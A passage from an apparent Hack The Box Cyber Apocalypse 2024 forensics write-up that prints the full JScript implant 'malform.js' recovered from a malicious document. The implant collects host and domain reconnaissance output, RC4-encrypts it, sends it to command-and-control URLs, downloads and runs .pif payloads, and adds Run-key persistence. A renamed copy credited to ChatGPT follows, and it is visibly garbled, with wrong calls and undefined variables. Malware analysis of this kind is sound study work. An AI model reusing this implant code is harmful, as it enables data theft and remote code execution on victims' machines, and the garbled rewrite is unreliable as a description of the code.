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";
        return r
    }
    ```
    

From the vba script, I’ve noticed that it runs with an argument: `vF8rdgMHKBrvCoCp0ulm`. Therefore, by modifying the original code, we `console.log` the output instead of using `eval()` function to retrieve the contents of the inner layer 

![Untitled](Cyber%20Apocalypse%202024%20Hacker%20Royale%20748bb11f26e3412784992cb82675722a/Untitled%208.png)

![Untitled](Cyber%20Apocalypse%202024%20Hacker%20Royale%20748bb11f26e3412784992cb82675722a/Untitled%209.png)

- Command run by `malform.js`
    
    ```jsx
    function S7EN(KL3M) {
        var gfjd = WScript.CreateObject("ADODB.Stream");
        gfjd.Type = 2;
        gfjd.CharSet = "437";
        gfjd.Open();
        gfjd.LoadFromFile(KL3M);
        var j3k6 = gfjd.ReadText;
        gfjd.Close();
        return l9BJ(j3k6)
    }
    
    var WQuh = new Array("http://challenge.htb/wp-includes/pomo/db.php", "http://challenge.htb/wp-admin/includes/class-wp-upload-plugins-list-table.php");
    var zIRF = "KRMLT0G3PHdYjnEm";
    var LwHA = new Array("systeminfo > ", "net view >> ", "net view /domain >> ", "tasklist /v >> ", "gpresult /z >> ", "netstat -nao >> ", "ipconfig /all >> ", "arp -a >> ", "net share >> ", "net use >> ", "net user >> ", "net user administrator >> ", "net user /domain >> ", "net user administrator /domain >> ", "set  >> ", "dir %systemdrive%\\Users\\*.* >> ", "dir %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\*.* >> ", "dir %userprofile%\\Desktop\\*.* >> ", 'tasklist /fi "modules eq wow64.dll"  >> ', 'tasklist /fi "modules ne wow64.dll" >> ', 'dir "%programfiles(x86)%" >> ', 'dir "%programfiles%" >> ', "dir %appdata% >>");
    var Z6HQ = new ActiveXObject("Scripting.FileSystemObject");
    var EBKd = WScript.ScriptName;
    var Vxiu = "";
    var lDd9 = a0rV();
    
    function DGbq(xxNA, j5zO) {
        char_set = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        var bzwO = "";
        var sW_c = "";
        for (var i = 0; i < xxNA.length; ++i) {
            var W0Ce = xxNA.charCodeAt(i);
            var o_Nk = W0Ce.toString(2);
            while (o_Nk.length < (j5zO ? 8 : 16)) o_Nk = "0" + o_Nk;
            sW_c += o_Nk;
            while (sW_c.length >= 6) {
                var AaP0 = sW_c.slice(0, 6);
                sW_c = sW_c.slice(6);
                bzwO += this.char_set.charAt(parseInt(AaP0, 2))
            }
        }
        if (sW_c) {
            while (sW_c.length < 6) sW_c += "0";
            bzwO += this.char_set.charAt(parseInt(sW_c, 2))
        }
        while (bzwO.length % (j5zO ? 4 : 8) != 0) bzwO += "=";
        return bzwO
    }
    var lW6t = [];
    lW6t["C7"] = "80";
    lW6t["FC"] = "81";
    lW6t["E9"] = "82";
    lW6t["E2"] = "83";
    lW6t["E4"] = "84";
    lW6t["E0"] = "85";
    lW6t["E5"] = "86";
    lW6t["E7"] = "87";
    lW6t["EA"] = "88";
    lW6t["EB"] = "89";
    lW6t["E8"] = "8A";
    lW6t["EF"] = "8B";
    lW6t["EE"] = "8C";
    lW6t["EC"] = "8D";
    lW6t["C4"] = "8E";
    lW6t["C5"] = "8F";
    lW6t["C9"] = "90";
    lW6t["E6"] = "91";
    lW6t["C6"] = "92";
    lW6t["F4"] = "93";
    lW6t["F6"] = "94";
    lW6t["F2"] = "95";
    lW6t["FB"] = "96";
    lW6t["F9"] = "97";
    lW6t["FF"] = "98";
    lW6t["D6"] = "99";
    lW6t["DC"] = "9A";
    lW6t["A2"] = "9B";
    lW6t["A3"] = "9C";
    lW6t["A5"] = "9D";
    lW6t["20A7"] = "9E";
    lW6t["192"] = "9F";
    lW6t["E1"] = "A0";
    lW6t["ED"] = "A1";
    lW6t["F3"] = "A2";
    lW6t["FA"] = "A3";
    lW6t["F1"] = "A4";
    lW6t["D1"] = "A5";
    lW6t["AA"] = "A6";
    lW6t["BA"] = "A7";
    lW6t["BF"] = "A8";
    lW6t["2310"] = "A9";
    lW6t["AC"] = "AA";
    lW6t["BD"] = "AB";
    lW6t["BC"] = "AC";
    lW6t["A1"] = "AD";
    lW6t["AB"] = "AE";
    lW6t["BB"] = "AF";
    lW6t["2591"] = "B0";
    lW6t["2592"] = "B1";
    lW6t["2593"] = "B2";
    lW6t["2502"] = "B3";
    lW6t["2524"] = "B4";
    lW6t["2561"] = "B5";
    lW6t["2562"] = "B6";
    lW6t["2556"] = "B7";
    lW6t["2555"] = "B8";
    lW6t["2563"] = "B9";
    lW6t["2551"] = "BA";
    lW6t["2557"] = "BB";
    lW6t["255D"] = "BC";
    lW6t["255C"] = "BD";
    lW6t["255B"] = "BE";
    lW6t["2510"] = "BF";
    lW6t["2514"] = "C0";
    lW6t["2534"] = "C1";
    lW6t["252C"] = "C2";
    lW6t["251C"] = "C3";
    lW6t["2500"] = "C4";
    lW6t["253C"] = "C5";
    lW6t["255E"] = "C6";
    lW6t["255F"] = "C7";
    lW6t["255A"] = "C8";
    lW6t["2554"] = "C9";
    lW6t["2569"] = "CA";
    lW6t["2566"] = "CB";
    lW6t["2560"] = "CC";
    lW6t["2550"] = "CD";
    lW6t["256C"] = "CE";
    lW6t["2567"] = "CF";
    lW6t["2568"] = "D0";
    lW6t["2564"] = "D1";
    lW6t["2565"] = "D2";
    lW6t["2559"] = "D3";
    lW6t["2558"] = "D4";
    lW6t["2552"] = "D5";
    lW6t["2553"] = "D6";
    lW6t["256B"] = "D7";
    lW6t["256A"] = "D8";
    lW6t["2518"] = "D9";
    lW6t["250C"] = "DA";
    lW6t["2588"] = "DB";
    lW6t["2584"] = "DC";
    lW6t["258C"] = "DD";
    lW6t["2590"] = "DE";
    lW6t["2580"] = "DF";
    lW6t["3B1"] = "E0";
    lW6t["DF"] = "E1";
    lW6t["393"] = "E2";
    lW6t["3C0"] = "E3";
    lW6t["3A3"] = "E4";
    lW6t["3C3"] = "E5";
    lW6t["B5"] = "E6";
    lW6t["3C4"] = "E7";
    lW6t["3A6"] = "E8";
    lW6t["398"] = "E9";
    lW6t["3A9"] = "EA";
    lW6t["3B4"] = "EB";
    lW6t["221E"] = "EC";
    lW6t["3C6"] = "ED";
    lW6t["3B5"] = "EE";
    lW6t["2229"] = "EF";
    lW6t["2261"] = "F0";
    lW6t["B1"] = "F1";
    lW6t["2265"] = "F2";
    lW6t["2264"] = "F3";
    lW6t["2320"] = "F4";
    lW6t["2321"] = "F5";
    lW6t["F7"] = "F6";
    lW6t["2248"] = "F7";
    lW6t["B0"] = "F8";
    lW6t["2219"] = "F9";
    lW6t["B7"] = "FA";
    lW6t["221A"] = "FB";
    lW6t["207F"] = "FC";
    lW6t["B2"] = "FD";
    lW6t["25A0"] = "FE";
    lW6t["A0"] = "FF";
    
    function a0rV() {
        var YrUH = Math.ceil(Math.random() * 10 + 25);
        var name = String.fromCharCode(Math.ceil(Math.random() * 24 + 65));
        var JKfG = WScript.CreateObject("WScript.Network");
        Vxiu = JKfG.UserName;
        for (var count = 0; count < YrUH; count++) {
            switch (Math.ceil(Math.random() * 3)) {
                case 1:
                    name = name + Math.ceil(Math.rERROR!
                        andom() * 8);
                    break;
                case 2:
                    name = name + String.fromCharCode(Math.ceil(Math.random() * 24 + 97));
                    break;
                default:
                    name = name + String.fromCharCode(Math.ceil(Math.random() * 24 + 65));
                    break
            }
        }
        return name
    }
    var icVh = Jp6A(HAP5());
    try {
        var CJPE = HAP5();
        W6cM();
        Syrl()
    } catch (e) {
        WScript.Quit()
    }
    
    function Syrl() {
        var m2n0 = xhOC();
        while (true) {
            for (var i = 0; i < WQuh.length; i++) {
                var bx_4 = WQuh[i];
                var czlA = V9iU(bx_4, m2n0);
                switch (czlA) {
                    case "good":
                        break;
                    case "exit":
                        WScript.Quit();
                        break;
                    case "work":
                        eRNv(bx_4);
                        break;
                    case "fail":
                        I7UO();
                        break;
                    default:
                        break
                }
                a0rV()
            }
            WScript.Sleep((Math.random() * 300 + 3600) * 1e3)
        }
    }
    
    function HAP5() {
        var zkDC = this["ActiveXObject"];
        var jVNP = new zkDC("WScript.Shell");
        return jVNP
    }
    
    function eRNv(caA2) {
        var jpVh = icVh + EBKd.substring(0, EBKd.length - 2) + "pif";
        var S47T = new ActiveXObject("MSXML2.XMLHTTP");
        S47T.OPEN("post", caA2, false);
        S47T.SETREQUESTHEADER("user-agent:", "Mozilla/5.0 (Windows NT 6.1; Win64; x64); " + he50());
        S47T.SETREQUESTHEADER("content-type:", "application/octet-stream");
        S47T.SETREQUESTHEADER("content-length:", "4");
        S47T.SETREQUESTHEADER("Cookie:", "flag=SFRCe200bGQwY3NfNHIzX2czdHQxbmdfVHIxY2tpMTNyfQo=");
        S47T.SEND("work");
        if (Z6HQ.FILEEXISTS(jpVh)) {
            Z6HQ.DELETEFILE(jpVh)
        }
        if (S47T.STATUS == 200) {
            var gfjd = new ActiveXObject("ADODB.STREAM");
            gfjd.TYPE = 1;
            gfjd.OPEN();
            gfjd.WRITE(S47T.responseBody);
            gfjd.Position = 0;
            gfjd.Type = 2;
            gfjd.CharSet = "437";
            var j3k6 = gfjd.ReadText(gfjd.Size);
            var RAKT = t7Nl("2f532d6baec3d0ec7b1f98aed4774843", l9BJ(j3k6));
            Trql(RAKT, jpVh);
            gfjd.Close()
        }
        var lDd9 = a0rV();
        nr3z(jpVh, caA2);
        WScript.Sleep(3e4);
        Z6HQ.DELETEFILE(jpVh)
    }
    
    function I7UO() {
        Z6HQ.DELETEFILE(WScript.SCRIPTFULLNAME);
        CJPE.REGDELETE("HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\run\\" + EBKd.substring(0, EBKd.length - 3));
        WScript.Quit()
    }
    
    function V9iU(pxug, tqDX) {
        try {
            var S47T = new ActiveXObject("MSXML2.XMLHTTP");
            S47T.OPEN("post", pxug, false);
            S47T.SETREQUESTHEADER("user-agent:", "Mozilla/5.0 (Windows NT 6.1; Win64; x64); " + he50());
            S47T.SETREQUESTHEADER("content-type:", "application/octet-stream");
            var SoNI = DGbq(tqDX, true);
            S47T.SETREQUESTHEADER("content-length:", SoNI.length);
            S47T.SEND(SoNI);
            return S47T.responseText
        } catch (e) {
            return ""
        }
    }
    
    function he50() {
        var wXgO = "";
        var JKfG = WScript.CreateObject("WScript.Network");
        var SoNI = zIRF + JKfG.ComputerName + Vxiu;
        for (var i = 0; i < 16; i++) {
            var DXHy = 0;
            for (var j = i; j < SoNI.length - 1; j++) {
                DXHy = DXHy ^ SoNI.charCodeAt(j)
            }
            DXHy = DXHy % 10;
            wXgO = wXgO + DXHy.toString(10)
        }
        wXgO = wXgO + zIRF;
        return wXgO
    }
    
    function W6cM() {
        v_FileName = icVh + EBKd.substring(0, EBKd.length - 2) + "js";
        Z6HQ.COPYFILE(WScript.ScriptFullName, icVh + EBKd);
        var zIqu = (Math.random() * 150 + 350) * 1e3;
        WScript.Sleep(zIqu);
        CJPE.REGWRITE("HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\run\\" + EBKd.substring(0, EBKd.length - 3), "wscript.exe //B " + String.fromCharCode(34) + icVh + EBKd + String.fromCharCode(34) + " NPEfpRZ4aqnh1YuGwQd0", "REG_SZ")
    }
    
    function xhOC() {
        var U5rJ = icVh + "~dat.tmp";
        for (var i = 0; i < LwHA.length; i++) {
            CJPE.Run("cmd.exe /c " + LwHA[i] + '"' + U5rJ + "", 0, true)
        }
        var jxHd = S7EN(U5rJ);
        WScript.Sleep(1e3);
        Z6HQ.DELETEFILE(U5rJ);
        return t7Nl("2f532d6baec3d0ec7b1f98aed4774843", jxHd)
    }
    
    function nr3z(jpVh, caA2) {
        try {
            if (Z6HQ.FILEEXISTS(jpVh)) {
                CJPE.Run('"' + jpVh + '"')
            }
        } catch (e) {
            var S47T = new ActiveXObject("MSXML2.XMLHTTP");
            S47T.OPEN("post", caA2, false);
            var ND3M = "error";
            S47T.SETREQUESTHEADER("user-agent:", "Mozilla/5.0 (Windows NT 6.1; Win64; x64); " + he50());
            S47T.SETREQUESTHEADER("content-type:", "application/octet-stream");
            S47T.SETREQUESTHEADER("content-length:", ND3M.length);
            S47T.SEND(ND3M);
            return ""
        }
    }
    
    function poBP(QQDq) {
        var HiEg = "0123456789ABCDEF";
        var L9qj = HiEg.substr(QQDq & 15, 1);
        while (QQDq > 15) {
            QQDq >= 4;
            L9qj = HiEg.substr(QQDq & 15, 1) + L9qj
        }
        return L9qj
    }
    
    function JbVq(x4hL) {
        return parseInt(x4hL, 16)
    }
    
    function l9BJ(Wid9) {
        var wXgO = [];
        var pV8q = Wid9.length;
        for (var i = 0; i < pV8q; i++) {
            var yWql = Wid9.charCodeAt(i);
            if (yWql >= 128) {
                var h = lW6t["" + poBP(yWql)];
                yWql = JbVq(h)
            }
            wXgO.push(yWql)
        }
        return wXgO
    }
    
    function Trql(EQ4R, K5X0) {
        var gfjd = WScript.CreateObject("ADODB.Stream");
        gfjd.type = 2;
        gfjd.Charset = "iso-8859-1";
        gfjd.Open();
        gfjd.WriteText(EQ4R);
        gfjd.Flush();
        gfjd.Position = 0;
        gfjd.SaveToFile(K5X0, 2);
        gfjd.close()
    }
    
    function Jp6A(KgOm) {
        icVh = "c:\\Users\\" + Vxiu + "\\AppData\\Local\\MicrosoftERROR!\\Windows\\ ";
        if (!Z6HQ.FOLDEREXISTS(icVh)) icVh = "c: \\Users\\ " + Vxiu + "\\AppData\\ Local\\ Temp\\ ";
        if (!Z6HQ.FOLDEREXISTS(icVh)) icVh = "c: \\Documents and Settings\\ " + Vxiu + "\\Application Data\\ Microsoft\\ Windows\\ ";
        return icVh
    }
    
    function t7Nl(npmb, AIsp) {
        var M4tj = [];
        var KRYr = 0;
        var FPIW;
        var wXgO = "";
        for (var i = 0; i < 256; i++) {
            M4tj[i] = i
        }
        for (var i = 0; i < 256; i++) {
            KRYr = (KRYr + M4tj[i] + npmb.charCodeAt(i % npmb.length)) % 256;
            FPIW = M4tj[i];
            M4tj[i] = M4tj[KRYr];
            M4tj[KRYr] = FPIW
        }
        var i = 0;
        var KRYr = 0;
        for (var y = 0; y < AIsp.length; y++) {
            i = (i + 1) % 256;
            KRYr = (KRYr + M4tj[i]) % 256;
            FPIW = M4tj[i];
            M4tj[i] = M4tj[KRYr];
            M4tj[KRYr] = FPIW;
            wXgO += String.fromCharCode(AIsp[y] ^ M4tj[(M4tj[i] + M4tj[KRYr]) % 256])
        }
        return wXgO
    }
    ```
    
- De-obfuscated command run by `malform.js` [by ChatGPT]
    
    ```jsx
    function executeScript(filepath) {
        var streamObj = WScript.CreateObject("ADODB.Stream");
        streamObj.Type = 2;
        streamObj.CharSet = "437";
        streamObj.Open();
        streamObj.LoadFromFile(filepath);
        var scriptContent = streamObj.ReadText;
        streamObj.Close();
        return decodeBase64(scriptContent);
    }
    
    var urls = new Array("http://challenge.htb/wp-includes/pomo/db.php", "http://challenge.htb/wp-admin/includes/class-wp-upload-plugins-list-table.php");
    var secretKey = "KRMLT0G3PHdYjnEm";
    var commands = new Array("systeminfo > ", "net view >> ", "net view /domain >> ", "tasklist /v >> ", "gpresult /z >> ", "netstat -nao >> ", "ipconfig /all >> ", "arp -a >> ", "net share >> ", "net use >> ", "net user >> ", "net user administrator >> ", "net user /domain >> ", "net user administrator /domain >> ", "set  >> ", "dir %systemdrive%\\Users\\*.* >> ", "dir %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\*.* >> ", "dir %userprofile%\\Desktop\\*.* >> ", 'tasklist /fi "modules eq wow64.dll"  >> ', 'tasklist /fi "modules ne wow64.dll" >> ', 'dir "%programfiles(x86)%" >> ', 'dir "%programfiles%" >> ', "dir %appdata% >>");
    var fileSystemObj = new ActiveXObject("Scripting.FileSystemObject");
    var scriptFileName = WScript.ScriptName;
    var userName = "";
    var randomName = generateRandomName();
    
    function encodeBase64(inputStr, isUrlSafe) {
        var charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        var encodedStr = "";
        var bitString = "";
        for (var i = 0; i < inputStr.length; ++i) {
            var charCode = inputStr.charCodeAt(i);
            var binaryString = charCode.toString(2);
            while (binaryString.length < (isUrlSafe ? 8 : 16)) binaryString = "0" + binaryString;
            bitString += binaryString;
            while (bitString.length >= 6) {
                var chunk = bitString.slice(0, 6);
                bitString = bitString.slice(6);
                encodedStr += charset.charAt(parseInt(chunk, 2))
            }
        }
        if (bitString) {
            while (bitString.length < 6) bitString += "0";
            encodedStr += charset.charAt(parseInt(bitString, 2))
        }
        while (encodedStr.length % (isUrlSafe ? 4 : 8) !== 0) encodedStr += "=";
        return encodedStr;
    }
    
    var charMap = [];
    charMap["C7"] = "80";
    charMap["FC"] = "81";
    charMap["E9"] = "82";
    charMap["E2"] = "83";
    charMap["E4"] = "84";
    charMap["E0"] = "85";
    charMap["E5"] = "86";
    charMap["E7"] = "87";
    charMap["EA"] = "88";
    charMap["EB"] = "89";
    charMap["E8"] = "8A";
    charMap["EF"] = "8B";
    charMap["EE"] = "8C";
    charMap["EC"] = "8D";
    charMap["C4"] = "8E";
    charMap["C5"] = "8F";
    charMap["C9"] = "90";
    charMap["E6"] = "91";
    charMap["C6"] = "92";
    charMap["F4"] = "93";
    charMap["F6"] = "94";
    charMap["F2"] = "95";
    charMap["FB"] = "96";
    charMap["F9"] = "97";
    charMap["FF"] = "98";
    charMap["D6"] = "99";
    charMap["DC"] = "9A";
    charMap["A2"] = "9B";
    charMap["A3"] = "9C";
    charMap["A5"] = "9D";
    charMap["20A7"] = "9E";
    charMap["192"] = "9F";
    charMap["E1"] = "A0";
    charMap["ED"] = "A1";
    charMap["F3"] = "A2";
    charMap["FA"] = "A3";
    charMap["F1"] = "A4";
    charMap["D1"] = "A5";
    charMap["AA"] = "A6";
    charMap["BA"] = "A7";
    charMap["BF"] = "A8";
    charMap["2310"] = "A9";
    charMap["AC"] = "AA";
    charMap["BD"] = "AB";
    charMap["BC"] = "AC";
    charMap["A1"] = "AD";
    charMap["AB"] = "AE";
    charMap["BB"] = "AF";
    charMap["2591"] = "B0";
    charMap["2592"] = "B1";
    charMap["2593"] = "B2";
    charMap["2502"] = "B3";
    charMap["2524"] = "B4";
    charMap["2561"] = "B5";
    charMap["2562"] = "B6";
    charMap["2556"] = "B7";
    charMap["2555"] = "B8";
    charMap["2563"] = "B9";
    charMap["2551"] = "BA";
    charMap["2557"] = "BB";
    charMap["255D"] = "BC";
    charMap["255C"] = "BD";
    charMap["255B"] = "BE";
    charMap["2510"] = "BF";
    charMap["2514"] = "C0";
    charMap["2534"] = "C1";
    charMap["252C"] = "C2";
    charMap["251C"] = "C3";
    charMap["2500"] = "C4";
    charMap["253C"] = "C5";
    charMap["255E"] = "C6";
    charMap["255F"] = "C7";
    charMap["255A"] = "C8";
    charMap["2554"] = "C9";
    charMap["2569"] = "CA";
    charMap["2566"] = "CB";
    charMap["2560"] = "CC";
    charMap["2550"] = "CD";
    charMap["256C"] = "CE";
    charMap["2567"] = "CF";
    charMap["2568"] = "D0";
    charMap["2564"] = "D1";
    charMap["2565"] = "D2";
    charMap["2559"] = "D3";
    charMap["2558"] = "D4";
    charMap["2552"] = "D5";
    charMap["2553"] = "D6";
    charMap["256B"] = "D7";
    charMap["256A"] = "D8";
    charMap["2518"] = "D9";
    charMap["250C"] = "DA";
    charMap["2588"] = "DB";
    charMap["2584"] = "DC";
    charMap["258C"] = "DD";
    charMap["2590"] = "DE";
    charMap["2580"] = "DF";
    charMap["3B1"] = "E0";
    charMap["DF"] = "E1";
    charMap["393"] = "E2";
    charMap["3C0"] = "E3";
    charMap["3A3"] = "E4";
    charMap["3C3"] = "E5";
    charMap["B5"] = "E6";
    charMap["3C4"] = "E7";
    charMap["3A6"] = "E8";
    charMap["398"] = "E9";
    charMap["3A9"] = "EA";
    charMap["3B4"] = "EB";
    charMap["221E"] = "EC";
    charMap["3C6"] = "ED";
    charMap["3B5"] = "EE";
    charMap["2229"] = "EF";
    charMap["2261"] = "F0";
    charMap["B1"] = "F1";
    charMap["2265"] = "F2";
    charMap["2264"] = "F3";
    charMap["2320"] = "F4";
    charMap["2321"] = "F5";
    charMap["F7"] = "F6";
    charMap["2248"] = "F7";
    charMap["B0"] = "F8";
    charMap["2219"] = "F9";
    charMap["B7"] = "FA";
    charMap["221A"] = "FB";
    charMap["207F"] = "FC";
    charMap["B2"] = "FD";
    charMap["25A0"] = "FE";
    charMap["A0"] = "FF";
    
    function generateRandomName() {
        var length = Math.ceil(Math.random() * 10 + 25);
        var name = String.fromCharCode(Math.ceil(Math.random() * 24 + 65));
        var networkObj = WScript.CreateObject("WScript.Network");
        userName = networkObj.UserName;
        for (var count = 0; count < length; count++) {
            switch (Math.ceil(Math.random() * 3)) {
                case 1:
                    name = name + Math.ceil(Math.random() * 8);
                    break;
                case 2:
                    name = name + String.fromCharCode(Math.ceil(Math.random() * 24 + 97));
                    break;
                default:
                    name = name + String.fromCharCode(Math.ceil(Math.random() * 24 + 65));
                    break;
            }
        }
        return name;
    }
    
    var registry = getRegistryHandler(HAP5());
    try {
        var shell = HAP5();
        setupAutorun();
        runCommands()
    } catch (e) {
        WScript.Quit();
    }
    
    function runCommands() {
        var encodedCmds = encodeBase64(randomName, true);
        while (true) {
            for (var i = 0; i < urls.length; i++) {
                var url = urls[i];
                var response = sendRequest(url, encodedCmds);
                switch (response) {
                    case "good":
                        break;
                    case "exit":
                        WScript.Quit();
                        break;
                    case "work":
                        executeScript(url);
                        break;
                    case "fail":
                        cleanup();
                        break;
                    default:
                        break;
                }
                generateRandomName();
            }
            WScript.Sleep((Math.random() * 300 + 3600) * 1e3);
        }
    }
    
    function getRegistryHandler(obj) {
        return obj["ActiveXObject"];
    }
    
    function executeRemoteCommand(url, data) {
        var payloadFile = randomName + scriptFileName.substring(0, scriptFileName.length - 2) + "pif";
        var xhttp = new ActiveXObject("MSXML2.XMLHTTP");
        xhttp.OPEN("post", url, false);
        xhttp.SETREQUESTHEADER("user-agent:", "Mozilla/5.0 (Windows NT 6.1; Win64; x64); " + generateHash());
        xhttp.SETREQUESTHEADER("content-type:", "application/octet-stream");
        xhttp.SETREQUESTHEADER("content-length:", "4");
        xhttp.SETREQUESTHEADER("Cookie:", "flag=SFRCe200bGQwY3NfNHIzX2czdHQxbmdfVHIxY2tpMTNyfQo=");
        xhttp.SEND("work");
        if (fileSystemObj.FILEEXISTS(payloadFile)) {
            fileSystemObj.DELETEFILE(payloadFile);
        }
        if (xhttp.STATUS == 200) {
            var streamObj = new ActiveXObject("ADODB.STREAM");
            streamObj.TYPE = 1;
            streamObj.OPEN();
            streamObj.WRITE(xhttp.responseBody);
            streamObj.Position = 0;
            streamObj.Type = 2;
            streamObj.CharSet = "437";
            var decodedScript = decodeBase64("2f532d6baec3d0ec7b1f98aed4774843", decodeBase64(streamObj.ReadText(streamObj.Size)));
            saveScript(decodedScript, payloadFile);
            streamObj.Close();
        }
        var randomName = generateRandomName();
        executeScript(payloadFile, url);
        WScript.Sleep(3e4);
        fileSystemObj.DELETEFILE(payloadFile);
    }
    
    function cleanup() {
        fileSystemObj.DELETEFILE(WScript.SCRIPTFULLNAME);
        registry.REGDELETE("HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\run\\" + scriptFileName.substring(0, scriptFileName.length - 3));
        WScript.Quit();
    }
    
    function sendRequest(url, data) {
        try {
            var xhttp = new ActiveXObject("MSXML2.XMLHTTP");
            xhttp.OPEN("post", url, false);
            xhttp.SETREQUESTHEADER("user-agent:", "Mozilla/5.0 (Windows NT 6.1; Win64; x64); " + generateHash());
            xhttp.SETREQUESTHEADER("content-type:", "application/octet-stream");
            var requestData = encodeBase64(data, true);
            xhttp.SETREQUESTHEADER("content-length:", requestData.length);
            xhttp.SEND(requestData);
            return xhttp.responseText;
        } catch (e) {
            return "";
        }
    }
    
    function generateHash() {
        var hash = "";
        var networkObj = WScript.CreateObject("WScript.Network");
        var payload = secretKey + networkObj.ComputerName + userName;
        for (var i = 0; i < 16; i++) {
            var xorResult = 0;
            for (var j = i; j < payload.length - 1; j++) {
                xorResult = xorResult ^ payload.charCodeAt(j);
            }
            xorResult = xorResult % 10;
            hash = hash + xorResult.toString(10);
        }
        hash = hash + secretKey;
        return hash;
    }
    
    function setupAutorun() {
        var scriptPath = randomName + scriptFileName.substring(0, scriptFileName.length - 2) + "js";
        fileSystemObj.COPYFILE(WScript.ScriptFullName, randomName + scriptFileName);
        var delayTime = (Math.random() * 150 + 350) * 1e3;
        WScript.Sleep(delayTime);
        registry.REGWRITE("HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\run\\" + scriptFileName.substring(0, scriptFileName.length - 3), "wscript.exe //B " + String.fromCharCode(34) + randomName + scriptFileName + String.fromCharCode(34) + " NPEfpRZ4aqnh1YuGwQd0", "REG_SZ");
    }
    
    function collectSystemInfo() {
        var tempFileName = randomName + "~dat.tmp";
        for (var i = 0; i < commands.length; i++) {
            shell.Run("cmd.exe /c " + commands[i] + '"' + tempFileName + "", 0, true);
        }
        var collectedData = readFromFile(tempFileName);
        WScript.Sleep(1e3);
        fileSystemObj.DELETEFILE(tempFileName);
        return decodeBase64("2f532d6baec3d0ec7b1f98aed4774843", collectedData);
    }
    
    function executeScript(filePath) {
        try {
            if (fileSystemObj.FILEEXISTS(filePath)) {
                shell.Run('"' + filePath + '"');
            }
        } catch (e) {
            var xhttp = new ActiveXObject("MSXML2.XMLHTTP");
            xhttp.OPEN("post", url, false);
            var requestData = "error";
            xhttp.SETREQUESTHEADER("user-agent:", "Mozilla/5.0 (Windows NT 6.1; Win64; x64); " + generateHash());
            xhttp.SETREQUESTHEADER("content-type:", "application/octet-stream");
            xhttp.SETREQUESTHEADER("content-length:", requestData.length);
            xhttp.SEND(requestData);
            return "";
        }
    }
    
    function encodeBase64(data, forUrl) {
